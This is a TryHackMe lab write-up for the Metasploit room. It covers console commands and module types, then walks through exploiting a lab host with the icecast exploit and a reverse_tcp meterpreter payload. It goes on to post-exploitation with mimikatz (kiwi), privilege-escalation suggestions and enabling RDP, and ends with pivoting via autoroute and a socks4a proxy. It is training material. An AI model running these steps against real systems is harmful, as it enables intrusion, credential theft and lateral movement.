#  TryHackMe - Metasploit (Room 016)

<details><summary>Intro</summary>
<p>

![](/Metasploit/images/metasploit.png)

Metasploit - an open source pentesting framework - is a powerful tool utilized by security engineers around the world. Maintained by Rapid7, Metasploit is a collection of not only thoroughly tested exploits but also auxiliary and post-exploitation tools. Throughout this room, we will explore the basics of using the framework and a few of the modules it includes

</p>
</details>

<details><summary>Initializing</summary>
<p>

![](/Metasploit/images/init.png)

If this is your first time using Metasploit, you will have just a few things to do before you utilize its full functionality

First things first, we need to initialize the database via the command `msfdb init`

![](/Metasploit/images/msfdb.png)

Before starting Metasploit, we can view some of the advanced options we can trigger for starting the console. Check these out now by using the command `msfconsole -h`

![](/Metasploit/images/help.png)

We can start the Metasploit console on the command line without showing the banner or any startup information as well via the `-q` flag

Once the database is initialized, go ahead and start Metasploit via the command `msfconsole`

![](/Metasploit/images/msfconsoel.png)

After Metasploit has started, you can check we have connected to the database via the `db_status` command

![](/Metasploit/images/db.png)

Metasploit uses a PostGreSQL type of database as seen above

</p>
</details>

<details><summary>Rock 'em to the Core [Commands]</summary>
<p>
	
![](/Metasploit/images/rock.png)

On the Metasploit prompt, type the command `help`

![](/Metasploit/images/help2.png)

The help menu has a very short one-character alias which is `?`

Finding various modules we have at our disposal within Metasploit is one of the most common commands we will leverage in the framework. The base command we use for searching is simply `search`

Once we have found the module we want to leverage, we use the command `use` to select it. If we want to view information about either a specific module or just the active module we use the `info` command

Metasploit has a built-in netcat-like function where we can make quick connections with a host simply to verify that we can talk to it. This command is the `connect` command

If you just want to see the MOTD/ASCII art when we start msfconsole, simply type the `banner` comamnd

![](/Metasploit/images/banner.png)

To change the value of a variable, we use the `set` command. Metasploit also supports the use of global variables, something which is incredibly useful when you are specifically focusing on a single box. The command to change global variables is the `setg` command

To view the value of the variables, we use the `get` command

![](/Metasploit/images/get.png)

To change the value of a variable to null/no value we use the `unset` command

When performing a penetration test, it is quite common to record your screen either for further review or for providing evidence of any actions taken. This is often couple with the collection of console output to a file as it can be incredibly useful to grep for different pieces of information output to the screen. The `spool` command can be used to set the console output to save to a file

Leaving a Metasploit console running is NOT always convenient and it can be helpful to have all of our previously set values load when starting up Metasploit. The `save` command can be used to store the settings/active datastores from Metasploit to a settings file. This saves within the msf4 or msf5 directory and can be undone easily by simply removing the created settings file

</p>
</details>

<details><summary>Modules for Every Occasion</summary>
<p>
	
![](/Metasploit/images/modules.png)

Metasploit consists of six core modules that make up the bulk of the tools you will utilize within it

![](/Metasploit/images/module.png)

Easily the most common module utilized is the `exploit` modules - these hold all of the exploit code we use. Another module used hand in hand with exploits is the `payload` modules which contain the various bits of shellcode we send to have executed following exploitation

The `auxiliary` module is most commonly used in scanning and verification that machines are exploitable

One of the most common activities after exploitation is looting and pivoting. The `post` module provides these capabilities

The `encoder` module allows us to modify the apperance of our exploit such that we avoid signature detection. It is commonly used in payload obfuscation

The `nop` module is used with buffer overflow and ROP attacks

To load different modules not loaded in by default, you can use the `load` command

</p>
</details>

<details><summary>Move That Shell</summary>
<p>

![](/Metasploit/images/shell2.jpg)
	
Metasploit comes with a built-in way to run nmap and feed it's results directly into the database. Can run it via the `db_nmap -sV [IP]` command

![](/Metasploit/images/nmap.png)

On port 135, it identifies the service as MS RPC. By typing the `hosts` command into msfconsole, we can see waht information we have collected in the database

![](/Metasploit/images/hosts.png)

By typing `services`, we can see more information

![](/Metasploit/images/services.png)

It's worth noting that Metasploit will keep track of discovered vulnerabilities. One of the many ways the database can be leveraged powerfully and quickly. Done by typing `vulns`

![](/Metasploit/images/vulns.png)

Now that we've scanned the victim system, we can try connecting to it with a Metasploit payload. First, we have to search for the target payload. In Metasploit 5 you can simply type `use` followed by a unique string found within only the target exploit

For example try it now with the following command `use icecast`. The full path for the exploit that appears in the prompt is `/exploit/windows/http/icecast_header`

![](/Metasploit/images/icecast.png)

While that command with the unique string can be incredibly useful, it is not quite the exploit we want. Now, run the command `search multi/handler`. We can use the number instead of the name of the module for quicker exploitation

![](/Metasploit/images/number.png)

Select the number 7 from the previous list and set the payload using the command `set PAYLOAD windows/meterpreter/reverse_tcp`. In this way, we can modify which payloads we want to use with our exploits. Additionally, run the command `set LHOST [IP]`

![](/Metasploit/images/set.png)

Next, go ahead and `use icecast` and set the RHOST to the IP via `set RHOSTS [ip]`

![](/Metasploit/images/ice.png)

Once the variables are set, run the exploit via the `exploit` command or the `run -j` command to run it as a job

![](/Metasploit/images/meterpreter.png)

Once started, we can check all of the jobs running on the system by running the `jobs` command

After we have established our connection, we can list all of our sessions using the command `sessions`. Similiarly, we can interact with a target session using the command `sessions -i [number]`

![](/Metasploit/images/sessions.png)

</p>
</details>

<details><summary>We're In, Now What?</summary>
<p>
	
![](/Metasploit/images/werein.png)

Now that we have a shell into our victim machine, let's take a look at several post-exploitation modules actions we can leverage

First things first, our initial shell/process typically is not very stable. Let's go ahead and attempt to move to a different process. First, let's list the processes using the command `ps`

![](/Metasploit/images/ps.png)

The name of the spool service is `spoolsv.exe`. We can try and migrate to that spool process. To migrate, simply type `migrate [PID]` along with the PID of the process

![](/Metasploit/images/migrate.png)

That migration did not work. Let's find out some more information about the system so we can try to elevate. The `getuid` command gives us more information regarding the current user running the process we are in

![](/Metasploit/images/getuid.png)

To find out more information about the system itself, we use the `sysinfo` command

![](/Metasploit/images/sysinfo.png)

To load a post exploitation module called mimikatz, we can type `load kiwi`

![](/Metasploit/images/kiwi.png)

If we want to transfer files to our victim, we use the `upload` command. If we want to run a Metasploit module, we use the `run` command. If we want to figure out the networking information and interfaces on our victim, we can run the `ipconfig` command

![](/Metasploit/images/ip.png)

We can go ahead and run a few post modules from Metasploit. First, run the command `run /post/windows/gather/checkvm`. This determines if we are in a VM - very useful piece of knowledge for further pivoting

![](/Metasploit/images/checkvm.png)

Next, try running `run /post/multi/recon/local_exploit_suggester`. This checks for various exploits which we can run within our session to elevate our privileges

![](/Metasploit/images/suggest.png)

Finally, let's try forcing RDP to be available. This won't work since we are not administrators but this is a fun command to know about: `run post/windows/manage/enable_rdp`

![](/Metasploit/images/rdp.png)

Can also run the `shell` command to spawn a normal system shell on the victim
</p>
</details>

<details><summary>Makin' Cisco Proud</summary>
<p>
	
![](/Metasploit/images/cisco.png)

Last but not least, let's take a look at the autorouting options available to us in Metaspoit. While our victim machine may not have multiple network interfaces (NICs) we will walk through the motions of pivoting through our victim as if it did have access to extra networks

First, run the command `run autoroute -h`. This pulls up the help menu for autoroute. To add a route to the following subnet (172.18.1.0/24), we use the command:

	`run autoroute -s 172.18.1.0/24 -n 255.255.255.0`

![](/Metasploit/images/autoroute.png)

Additionally, we can start a socks4a proxy server out of this session. First, background out of the current meterpreter session and run the command `search server/socks4a`. The full path of this auxiliary module is `auxiliary/server/socks4a`

![](/Metasploit/images/socks.png)

Once we have started a socks server, we can modify our /etc/proxychains.conf file to include our new server. The `proxychains` command allows us to run them through our socks4a server
</p>
</details>